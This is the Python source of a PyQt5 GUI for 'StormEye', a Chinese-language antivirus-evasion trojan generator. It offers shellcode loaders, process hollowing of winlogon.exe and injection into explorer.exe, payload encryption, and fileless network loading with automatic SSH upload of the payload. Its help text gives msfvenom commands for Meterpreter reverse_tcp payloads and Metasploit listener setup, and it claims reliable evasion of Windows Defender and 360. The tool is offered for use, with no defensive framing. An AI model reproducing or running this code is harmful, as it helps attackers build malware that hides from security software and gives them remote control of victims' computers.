#encoding:utf-8

import importlib
import os
import re
import sys
import time

import paramiko
from PyQt5.QtCore import QThread, pyqtSignal, Qt, QRect
from PyQt5.QtGui import QIcon
from PyQt5.QtWidgets import QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QLabel, QLineEdit, \
    QPushButton, QButtonGroup, QRadioButton, QComboBox, QDesktopWidget, QFileDialog, QCheckBox, QFrame, QTextEdit

from PyQt5.QtWidgets import QTabWidget
import threading

from TrojanCreater import Creater

from lib.SSHServer import readConfig,saveConfig,getRemotePath
from lib.SSHServer import main as sshMain
import traceback
from shellcoder import networkMode


class Worker(QThread):
    sinOut = pyqtSignal(str)

    def __init__(self, parent=None):
        super(Worker, self).__init__(parent)
        #设置工作状态与初始num数值
        self.working = False
        self.num = 0

    def __del__(self):
        #线程状态改变与线程终止
        self.working = False
        self.wait()
        print('销毁')

    def run(self):
        print('run')
        while True:
            time.sleep(1)
            if self.working:
                # file_str = 'File index{0}'.format(self.num)
                self.num += 1
                # 发射信号
                self.sinOut.emit(str(self.num))
                # 线程休眠2秒

                # self.__del__()


class commonFun():
    def __init__(self):
        print('init:',self)
        self.dic1={
            '动态内存加载器1':'VirtualAlloc1.py',
            '动态内存加载器2':'VirtualAlloc2.py',
            'ipv4加载器':'ipv4Loader.py',
            'ipv6加载器':'ipv6Loader.py',
            'mac加载器':'macLoader.py',
            'uuid加载器':'uuidLoader.py',
        }
        self.dic2={
            '进程镂空':'ProcessHollowing.py',
            '进程注入':'RemoteInject.py'

        }
        self.dic3={
            'base64+随机位移':'base64Enc.py',
        }
        self.dic4={}
        self.dic4.update(self.dic1)
        self.dic4.update(self.dic2)

        self.flush=Worker()
        self.flush.sinOut.connect(self.flush_ui)
        self.flush.start()

    def ChoseFileName(self):
        path=os.path.dirname(os.path.abspath(__file__))+os.sep+'config'
        try:
            os.makedirs(path)
        except:
            pass
        fname = QFileDialog.getOpenFileName(self, '选择文件名', path,f"Vertex file({self.fileType})",None,QFileDialog.DontUseNativeDialog)
        print(fname)
        if fname[0]:
            print(fname[0])
            self.fileNameEdit.setText(fname[0])

        self.changeEachTime()


    def GetMethod(self,pressed):

        source=self.sender()
        # print(pressed)
        # print(source.text())
        if source.text()=='shellcode网络分离':
            print('?',pressed)
            if pressed:
                self.shellcodeSplitInfo='\n【shellcode网络分离】：\n从http或https站点加载shellcode（推荐使用https以更好的隐匿自己），可以做到shellcode不落地，配合进程注入和进程镂空、删除加载器文件等可以实现无文件落地的效果，具有很好的隐蔽性。勾选将URL写入木马可以免去运行时手动输入URL地址的情况，也可以选择在配置中添加web网站SSH的账号密码让脚本自动同步上传PayloadFile，【因为加密器可能会使用随机数导致每次生成的PayloadFile和shellcode加载器都不相同，所以每次重写生成后都需要更新你网站上的PayloadFile文件】'
            self.localsplit.setChecked(False)
            self.ipaddrEdit.setHidden(False if pressed else True)
            self.ipaddrLable.setHidden(False if pressed else True)
            self.urlWriteIn.setHidden(False if pressed else True)

        elif source.text()=='shellcode本地分离':
            if pressed:
                self.shellcodeSplitInfo='\n【shellcode本地分离】：\n将shellcode和加载器进行分离，具有不错的免杀效果，使用时需要将生成的xxx.exe和PayloadFile放在同目录，或运行时手动输入PayloadFile文件路径'
            self.networksplit.setChecked(False)
            self.ipaddrEdit.setHidden(True)
            self.ipaddrLable.setHidden(True)
            self.urlWriteIn.setHidden(True)

        else:
            pass
            # print(self.shellcodeCombo.currentText())
            # print(self.localsplit.isChecked())
            print(self.fileNameEdit.text())



        if not pressed:
            self.shellcodeSplitInfo=''


        self.changeEachTime()


    def Getmapping(self,type_):

        if type_=='normal':
            return list(self.dic1.keys())
        elif type_=='Encoder':
            return list(self.dic3.keys())
        elif type_=='hidden':
            return list(self.dic2.keys())

    def GetCombo(self):
        print(self.shellcodeCombo.currentText())
        print(self.cryptorCombo.currentText())
        self.shellcodeType=self.shellcodeCombo.currentText()
        self.cryptorType=self.cryptorCombo.currentText()
        if self.shellcodeCombo.currentText()=='进程注入' or self.shellcodeCombo.currentText()=='进程镂空':
            self.changeEachTime()

        self.changeEachTime()



    def setDefault(self,type_):

        if type_=='normal':
            self.nomalInfo='【普通模式】：\n经测试对360、VT等有很好的免杀效果'
        elif type_=='hidden':

            self.nomalInfo='【隐匿模式】：\n经测试，使用进程镂空winlogon.exe具有非常好的免杀和隐蔽效果，可以稳定上线Windows Defender、360'

        self.cryptorType=self.Getmapping('Encoder')[0]    #获取加解密器的类型
        self.shellcodeType=self.Getmapping(type_)[0]      #获取shellcode的类型
        self.shellcodeSplitInfo=''                        #shellcode分离类型
        self.shellcodeInfo=''                             #shelcode info信息
        self.cryptorInfo=''                               #加解密器的info信息
        self.url=''                                       #url地址
        self.host=''                                      #配置文件中host地址
        self.port=22                                      #配置文件中port
        self.username=''                                  #配置文件中username
        self.password=''                                  #配置文件中password
        self.remotepath=''                                #配置文件中remotepath


        self.changeEachTime()


    def getInfo(self,file):
        # print(file)
        file=file.replace('.py','')
        md=importlib.import_module(file)
        try:
            info = md.info
        except:
            info = ''
        return info

    def changeEachTime(self):
        print('刷新')
        if self.shellcodeType=='进程注入':
            self.fileType='*.py'
            self.targetEditInfo=f'(固定值：explorer.exe，测试注入其他进程无效)'
            # 设置目标进程名编辑框的默认提示信息：
            self.targetEdit.setPlaceholderText(self.targetEditInfo)
            self.fileNameEdit.setPlaceholderText('请选择cs或者msf生成的.py格式shellcode')
        elif self.shellcodeType=='进程镂空':
            self.targetEditInfo=f'(默认值：winlogon.exe，可修改为指定程序路径）'
            self.fileType='*.exe'
            # 设置目标进程名编辑框的默认提示信息：
            self.targetEdit.setPlaceholderText(self.targetEditInfo)
            self.fileNameEdit.setPlaceholderText('请选择cs或者msf生成的.exe木马')

        else:
            self.fileNameEdit.setPlaceholderText('请选择cs或者msf生成的.py格式shellcode')
            self.fileType='*.py'


        self.shellcodeInfo=self.getInfo('shellcodeLoader'+'.'+self.dic4[self.shellcodeType])
        self.cryptorInfo=self.getInfo('Encoder'+'.'+self.dic3[self.cryptorType])
        # print(self.shellcodeInfo)

        #每次改变tip提示信息
        
        self.tipInfo.setText(self.nomalInfo+f'\n\n【{self.cryptorType}】：\n{self.cryptorInfo}'+f'\n\n【{self.shellcodeType}】：\n'+self.shellcodeInfo+'\n'+self.shellcodeSplitInfo)


        #每次改变url地址：
        self.readSSHConfig()    #重新读取SSH配置文件
        self.ipaddrEdit.setText(self.url)


    def readSSHConfig(self):
        value=readConfig()
        if not value:
            self.url=''
        else:
            self.host=value[0]
            self.port=value[1]
            self.username=value[2]
            self.password=value[3]
            self.remotepath=value[4]
            self.url=value[5]+'PayloadFile'


    def debug(self,arg):
        data=f"{self.shellcodeType}模式请选择{'.exe' if self.shellcodeType=='进程镂空' else '.py'}格式payload"
        str00=f'<span style="color: red;">{data}</span>'
        str0=f'<span style="color: red;">请选择cs或msf生成的{".exe" if self.shellcodeType=="进程镂空" else ".py" }格式shellcode</span>'

        str1=f"""<br/><br/>【CS】：<br/>
payload生成器-> 输出格式Python（勾选x64）

【msf】：
msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -i 3 -f python -o cspayload.py<br/>
<br/>
【开启msf监听】：<br/>
> use exploit/multi/handler<br/>
> set lhost x.x.x.x<br/>
> set lport xxx<br/>
> set payload windows/x64/meterpreter/reverse_tcp<br/>
> run<br/>
"""
        str2=f"""：<br/><br/>【CS】：
Windows可执行程序（勾选x64）<br/>
<br/>
【msf】：<br/>
msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -b\'\\x00\'  -f exe > csartifacet.exe<br/>
<br/>
【开启msf监听】：<br/>
> use exploit/multi/handler<br/>
> set lhost x.x.x.x<br/>
> set lport xxx<br/>
> set payload windows/x64/meterpreter/reverse_tcp<br/>
> run       <br/>

"""

        if not arg.get('payloadFile'):
            # self.tipInfo.setText('aaaa')
            self.tipInfo.setText(str0+(str2 if self.shellcodeType=="进程镂空" else str1))
            return False

        if self.shellcodeType=='进程镂空' :
            if re.search(r'\.exe',self.fileNameEdit.text()):
                return True
            else:
                self.tipInfo.setText(str00+(str2 if self.shellcodeType=="进程镂空" else str1))
                return False
        else:
            if re.search(r'\.py',self.fileNameEdit.text()):
                return True
            else:
                self.tipInfo.setText(str00+(str2 if self.shellcodeType=="进程镂空" else str1))
                return False


        return True


    def GoRun(self):
        #刷新一下
        self.changeEachTime()

        spliteMode=''
        if self.localsplit.isChecked():
            spliteMode='local'
        elif self.networksplit.isChecked():
            spliteMode='network'

        try:
            TARGET_EXE=self.targetEdit.text()
        except:
            TARGET_EXE=''


        is_urlWriteIn=self.urlWriteIn.checkState()
        if spliteMode=='network' and not self.ipaddrEdit.text().strip():
            is_urlWriteIn=0


        arg={
            'shellcodeLoaderType':self.dic4[self.shellcodeCombo.currentText()],
            'cryptoType':self.dic3[self.cryptorCombo.currentText()],
            'spliteMode': spliteMode,
            'payloadFile':self.fileNameEdit.text(),
            'url':self.ipaddrEdit.text(),

            'is_64':self.check64.checkState(),
            'is_hidden':self.hiddenWindow.checkState(),
            'is_savePyFile':self.savePyFile.checkState(),
            'is_urlWriteIn':is_urlWriteIn,
            'otherdic':{"TARGET_EXE":TARGET_EXE}

        }
        print(arg)
        if self.debug(arg):
            #重新读取SSH配置文件
            self.readSSHConfig()

            #生成木马文件
            self.t_main(self.t_gorun,arg)





    def changeConfig(self):

        result=saveConfig(self.hostEdit.text(),
                   self.portEdit.text(),
                   self.usernameEdit.text(),
                   self.passwordEdit.text(),
                   self.remotepathEdit.text(),
                   self.urlEdit.text()
                   )
        print(result)
        if not result:
            self.tipInfo.setText('修改成功!')
        else:
            self.tipInfo.setText(result)

    def testConnect(self):
        # result=testConnect(
        #     self.hostEdit.text(),
        #     self.portEdit.text(),
        #     self.usernameEdit.text(),
        #     self.passwordEdit.text()
        # )
        # if  not result:
        #     self.tipInfo.setText('服务器连接成功!')
        # else:
        #
        #     self.tipInfo.setText(result)
        self.t_main(self.t_testConnect,self.hostEdit.text(),self.portEdit.text(),self.usernameEdit.text(),self.passwordEdit.text())
        print('yes')


    def t_gorun(self,arg):

        self.result='正在执行，请稍等'
        self.flush.working=True
        try:
            if arg['spliteMode']=='network':


                if self.host and self.port and self.username and self.password and self.url:
                    if self.urlWriteIn.checkState():
                    #要将url写入exe
                        #1.服务器健康检测
                        self.result=f'<br/>正在测试连接SSH服务器{self.host}:{self.port}'
                        if  self.t_testConnect(self.host,self.port,self.username,self.password):
                            self.result += "<br>正在检测url地址"
                        else:
                            # self.result = f'SSH连接服务器{self.host}:{self.port}失败！'
                            return False
                        #2.url检测
                        if networkMode(self.url):
                            self.result+="<br/><span style='color: green;'>PayloadFile URL健康检测通过</span><br/>正在生成木马"
                    else:
                        #url不写入exe
                        self.result = "配置URL不写入木马，运行时候需要手动输入URL，正在生成木马"

                else:
                    self.result = "<span style='color: blue;'>未在配置中添加完整的SSH服务器信息和URL信息，生成的PayloadFile必须手动上传到服务器（每次会变化）</span><br/>正在生成木马"
                #3.生成木马
                result=Creater(arg).run()
                self.result = result

                #4.如果是网络分离模式，如果配置了SSH服务器，那么自动将生成的PayloadFile文件同步到服务器。
                sshMain(self.host,
                        int(self.port),
                        self.username,
                        self.password,
                        f"{os.path.dirname(os.path.abspath(__file__))+os.sep+'result'+os.sep+'PayloadFile'}",
                        self.remotepath)
            else:
                #1.生成木马
                result=Creater(arg).run()
                self.result = result
        except:
            self.result=traceback.format_exc()


    def t_testConnect(self,ssh_host, ssh_port, ssh_user, ssh_password):
        try:
            print('?1')
            # 创建SSH客户端对象
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            print('?2')
            # 连接SSH服务器

            ssh.connect(ssh_host, ssh_port, ssh_user, ssh_password)
            print('?3')
            self.result=f"<span style='color: green;'>连接{ssh_host}:{ssh_port}成功</span>"
            return True
        except:
            self.result=traceback.format_exc()
            return False

    def t_main(self,fun,*args):
        self.result='正在执行，请稍等'
        self.flush.working=True
        t=threading.Thread(target=fun,args=(args))
        t.start()



    def flush_ui(self,num):
        # print(self.result)
        # print(num)

        if re.search('正在执行，请稍等',self.result):
            self.result='正在执行，请稍等'+'.'*int(num)
            if int(num)>6:
                self.flush.num=0
        elif re.search('正在',self.result):
            self.result += '.'
        else:
            self.flush.working=False
        self.tipInfo.setStyleSheet("color: rgba(0, 0, 0, 128);")
        self.tipInfo.setText(self.result)



class Common(QWidget,commonFun):
    def __init__(self):
        super().__init__()


        #go
        self.gobtn=QPushButton("Go")
        self.gobtn.resize(50,50)
        self.gobtn.clicked.connect(self.GoRun)


        # 第一排
        self.localsplit = QPushButton("shellcode本地分离")

        self.networksplit = QPushButton("shellcode网络分离")

        self.localsplit.setCheckable(True)

        self.networksplit.setCheckable(True)
        self.localsplit.clicked.connect(self.GetMethod)
        self.networksplit.clicked.connect(self.GetMethod)

        # 第二排
        self.fileNameLabel = QLabel("payload：")
        self.fileNameEdit = QLineEdit()

        self.selectFileButton = QPushButton("选择文件")
        self.selectFileButton.clicked.connect(self.ChoseFileName)

        # 第三排
        self.shellcodeLabel = QLabel("Shellcode 加载器类型：")
        self.shellcodeCombo = QComboBox()
        self.cryptorLabel = QLabel("加解密器类型：")
        self.cryptorCombo = QComboBox()

        self.shellcodeCombo.addItems(self.Getmapping('normal'))
        self.cryptorCombo.addItems(self.Getmapping('Encoder'))


        self.cryptorCombo.activated[str].connect(self.GetCombo)
        self.shellcodeCombo.activated[str].connect(self.GetCombo)



        # 第四排
        self.check64=QCheckBox("64位模式")

        self.hiddenWindow=QCheckBox("隐藏运行时窗口")
        self.savePyFile=QCheckBox("保留生成的py文件")
        self.urlWriteIn=QCheckBox("URL写入木马")

        self.check64.setChecked(True)
        self.urlWriteIn.setChecked(True)
        self.urlWriteIn.setHidden(True)
        # self.savePyFile.setHidden(True)

        self.check64.clicked.connect(self.GetMethod)
        self.hiddenWindow.clicked.connect(self.GetMethod)
        self.savePyFile.clicked.connect(self.GetMethod)
        self.urlWriteIn.clicked.connect(self.GetMethod)


        # 第五排
        self.ipaddrEdit=QLineEdit()
        self.ipaddrLable=QLabel("url地址：")





        #第7排 描述框
        self.tipInfo=QTextEdit(self)
        self.tipInfo.setStyleSheet("color: rgba(0, 0, 0, 128);")
        self.tipInfo.setReadOnly(True)
        self.tipInfo.resize(400,200)
        # self.tipInfo.setHidden(True)
        self.tipInfo.setFrameStyle(QFrame.Panel|QFrame.Sunken)
        # self.tipInfo.setAlignment(Qt.AlignBottom | Qt.AlignRight)



        # 布局
        self.vbox = QVBoxLayout(self)


        hbox2 = QHBoxLayout()
        hbox2.addWidget(self.localsplit)
        hbox2.addWidget(self.networksplit)
        self.vbox.addLayout(hbox2)

        hbox1 = QHBoxLayout()
        # hbox1.addStretch(1)
        hbox1.addWidget(self.fileNameLabel)
        hbox1.addWidget(self.fileNameEdit)
        hbox1.addWidget(self.selectFileButton)
        self.vbox.addLayout(hbox1)



        hbox3 = QHBoxLayout()

        hbox3.addWidget(self.shellcodeLabel)
        hbox3.addWidget(self.shellcodeCombo)
        hbox3.addWidget(self.cryptorLabel)
        hbox3.addWidget(self.cryptorCombo)
        hbox3.addStretch(1)
        self.vbox.addLayout(hbox3)

        hbox4 = QHBoxLayout()
        # hbox4.addStretch(1)
        hbox4.addWidget(self.check64)
        hbox4.addWidget(self.hiddenWindow)
        hbox4.addWidget(self.savePyFile)
        hbox4.addWidget(self.urlWriteIn)
        hbox4.addStretch(1)
        self.vbox.addLayout(hbox4)




        hbox5=QHBoxLayout()
        # hbox5.addStretch(1)
        hbox5.addWidget(self.ipaddrLable)
        hbox5.addWidget(self.ipaddrEdit)
        self.vbox.addLayout(hbox5)

        hbox0=QHBoxLayout()
        hbox0.addStretch(1)
        hbox0.addWidget(self.gobtn)
        hbox0.addStretch(1)
        self.vbox.addLayout(hbox0)


        self.ipaddrEdit.setHidden(True)
        self.ipaddrLable.setHidden(True)



    def bottom(self):
        hbox7=QHBoxLayout()
        hbox7.addWidget(self.tipInfo)
        hbox7.setGeometry(QRect(0, 0, 400, 200))
        self.vbox.addLayout(hbox7)

        self.vbox.addStretch(1)


    def onActivated(self, text):
        print('yes')
        # self.lbl.setText(text)
        # self.lbl.adjustSize()


class GeneralWidget(Common):
    def __init__(self):
        super().__init__()
        self.setDefault('normal')

        self.bottom()


class HiddenWidget(Common):
    def __init__(self):
        super().__init__()
        self.shellcodeCombo.clear()
        self.shellcodeCombo.addItems(self.Getmapping('hidden'))

        #隐匿模式下的第六排
        self.targetName=QLabel("目标进程名：")
        self.targetEdit=QLineEdit("")
        hbox6=QHBoxLayout()
        hbox6.addWidget(self.targetName)
        hbox6.addWidget(self.targetEdit)
        self.vbox.addLayout(hbox6)

        self.setDefault('hidden')
        self.changeEachTime()



        self.bottom()



class ConfigWidget(QWidget,commonFun):
    def __init__(self):
        super().__init__()
        confDic={
            'host':'',
            'port':22,
            'username':'root',
            'password':'',
            'remotepath':'/var/www/html',
            'url':''
        }
        value=readConfig()
        if value:
            confDic={
                'host':value[0],
                'port':value[1],
                'username':value[2],
                'password':value[3],
                'remotepath':value[4],
                'url':value[5]
            }

        vbox = QVBoxLayout(self)
        n=0
        for conf in confDic.keys():#将配置文件中的数据导出并构建组件显示
            n+=1
            print(f'self.{conf}Lable = QLabel("{conf}:")')
            eval(compile(f'self.{conf}Lable = QLabel("{conf}:")','asd','exec'))
            eval(compile(f'self.{conf}Edit = QLineEdit("{confDic[conf]}")','asd','exec'))
            eval(compile(f'hbox{n} = QHBoxLayout()','asd','exec'))
            eval(compile(f'hbox{n}.addWidget(self.{conf}Lable)','asd','exec'))
            eval(compile(f'hbox{n}.addWidget(self.{conf}Edit)','asd','exec'))
            eval(compile(f'vbox.addLayout(hbox{n})','asd','exec'))

        self.changeConfigbtn=QPushButton('保存配置')
        self.testConnectbtn=QPushButton('测试连接')
        self.changeConfigbtn.clicked.connect(self.changeConfig)
        self.testConnectbtn.clicked.connect(self.testConnect)

        hboxbtn=QHBoxLayout()
        hboxbtn.addWidget(self.changeConfigbtn)
        hboxbtn.addWidget(self.testConnectbtn)
        vbox.addLayout(hboxbtn)

        self.tipInfo=QTextEdit()
        self.tipInfo.setPlaceholderText("此处配置web服务器的SSH信息，当使用Shellcode网络分离模式时，由于加解密器会进行随机位移所以每次生成的PayloadFile都不一样，配置SSH后可以自动将最新的PayloadFile同步到自己服务器的remotepath目录（web根目录）")
        self.tipInfo.resize(400,200)
        hboxText=QHBoxLayout()
        hboxText.addWidget(self.tipInfo)
        vbox.addLayout(hboxText)



        vbox.addStretch(1)


class Window(QWidget,commonFun):
    def __init__(self):
        super().__init__()
        self.setWindowTitle('风暴免杀©StormEye')
        self.resize(500, 400)
        self.setup_ui()


    def setup_ui(self):
        # 创建选项卡
        self.tabWidget = QTabWidget(self)
        self.tabWidget.resize(500,400)
        self.tabWidget.addTab(GeneralWidget(), "普通模式")
        self.tabWidget.addTab(HiddenWidget(), "隐匿模式")
        self.tabWidget.addTab(ConfigWidget(), "配置")
        self.setWindowIcon(QIcon(os.path.dirname(os.path.abspath(__file__))+os.sep+'config'+os.sep+'ico.png'))

        # self.setStyleSheet("border: 1px；")
        # self.setFixedSize(500, 300)
        self.setAutoFillBackground(True)


        # 设置主窗口大小
        # self.resize(800, 600)

    def center(self):
        qr = self.frameGeometry()
        cp = QDesktopWidget().availableGeometry().center()
        qr.moveCenter(cp)
        self.move(qr.topLeft())


    def setPane( self,pressed):
        source = self.sender()

        if pressed:
            val = 255
        else: val = 0
        print('click')




if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = Window()
    window.show()
    sys.exit(app.exec_())